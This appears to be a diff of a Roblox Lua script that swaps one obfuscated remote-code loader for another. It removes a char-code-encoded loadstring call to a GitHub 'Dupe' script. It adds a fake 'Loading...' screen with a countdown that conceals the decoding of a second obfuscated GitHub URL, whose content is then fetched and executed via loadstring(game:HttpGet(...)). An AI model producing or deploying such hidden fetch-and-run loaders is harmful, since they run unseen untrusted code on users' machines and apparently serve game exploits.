@@ -1,5 +1,99 @@
-return(function()
-    local a = {"\108\111\097\100\115\116\114\105\110\103","\103\097\109\101","\072\116\116\112\071\101\116"}
-    local b = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\107\105\101\108\056\047\068\117\112\101\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\083\099\114\105\112\116"
-    return _G[a[1]](_G[a[2]][a[3]](_G[a[2]]:char(table.unpack({string.byte(b,1,#b)}))))
-end)()
+local _1 = game:GetService("Players")
+local _2 = _1.LocalPlayer
+local _3 = game:GetService("TweenService")
+local _4 = game:GetService("UserInputService")
+
+local _5 = Instance.new(string.char(83,99,114,101,101,110,71,117,105), _2:WaitForChild(string.char(80,108,97,121,101,114,71,117,105)))
+_5.Name = "_"..math.random(100000,999999)
+_5.IgnoreGuiInset = true
+_5.ResetOnSpawn = false
+_5.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local _6 = Instance.new(string.char(70,114,97,109,101), _5)
+_6.Size = UDim2.new(1,0,1,0)
+_6.BackgroundColor3 = Color3.new(0,0,0)
+_6.BackgroundTransparency = 1
+_6.ZIndex = 10
+
+_3:Create(_6, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
+
+local _7 = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _6)
+_7.Size = UDim2.new(0.6,0,0.1,0)
+_7.Position = UDim2.new(0.2,0,0.4,0)
+_7.BackgroundTransparency = 1
+_7.TextColor3 = Color3.new(1,1,1)
+_7.TextScaled = true
+_7.Font = Enum.Font.GothamBold
+_7.Text = string.char(76,111,97,100,105,110,103,46,46,46)
+
+local _8 = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _6)
+_8.Size = UDim2.new(0.6,0,0.08,0)
+_8.Position = UDim2.new(0.2,0,0.5,0)
+_8.BackgroundTransparency = 1
+_8.TextColor3 = Color3.new(1,1,1)
+_8.TextScaled = true
+_8.Font = Enum.Font.Gotham
+_8.Text = ""
+
+local _9 = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110), _6)
+_9.Size = UDim2.new(0.3,0,0.08,0)
+_9.Position = UDim2.new(0.35,0,0.65,0)
+_9.BackgroundColor3 = Color3.fromRGB(30,30,30)
+_9.TextColor3 = Color3.new(1,1,1)
+_9.TextScaled = true
+_9.Text = string.char(83,107,105,112)
+_9.Font = Enum.Font.GothamBold
+_9.Visible = false
+_9.AutoButtonColor = true
+_9.ZIndex = 11
+_9.BackgroundTransparency = 0.2
+_9.ClipsDescendants = true
+_9.AnchorPoint = Vector2.new(0,0)
+
+local _10 = 15
+local _11 = false
+
+task.delay(5, function()
+	_9.Visible = true
+end)
+
+_9.MouseButton1Click:Connect(function()
+	_11 = true
+	_10 = 0
+end)
+
+task.spawn(function()
+	while _10 > 0 do
+		_8.Text = string.char(83,116,97,114,116,105,110,103,32,105,110,32) .. _10 .. string.char(115)
+		_10 -= 1
+		wait(1)
+	end
+end)
+
+repeat wait(0.1) until _10 <= 0
+
+-- 🧨 Obfuscated loadstring URL
+local _12 = string.char(
+104,116,116,112,115,58,47,47,
+114,97,119,46,103,105,116,104,
+117,98,117,115,101,114,99,111,
+110,116,101,110,116,46,99,111,
+109,47,83,99,114,105,112,116,
+45,68,101,118,101,108,111,112,
+101,114,47,72,105,100,101,47,
+114,101,102,115,47,104,101,97,
+100,115,47,109,97,105,110,47,
+72,105,100,105,110,103
+)
+
+pcall(function()
+	loadstring(game:HttpGet(_12))()
+end)
+
+_3:Create(_6, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+_3:Create(_7, TweenInfo.new(1), {TextTransparency = 1}):Play()
+_3:Create(_8, TweenInfo.new(1), {TextTransparency = 1}):Play()
+_3:Create(_9, TweenInfo.new(1), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
+
+wait(1.2)
+_5:Destroy()
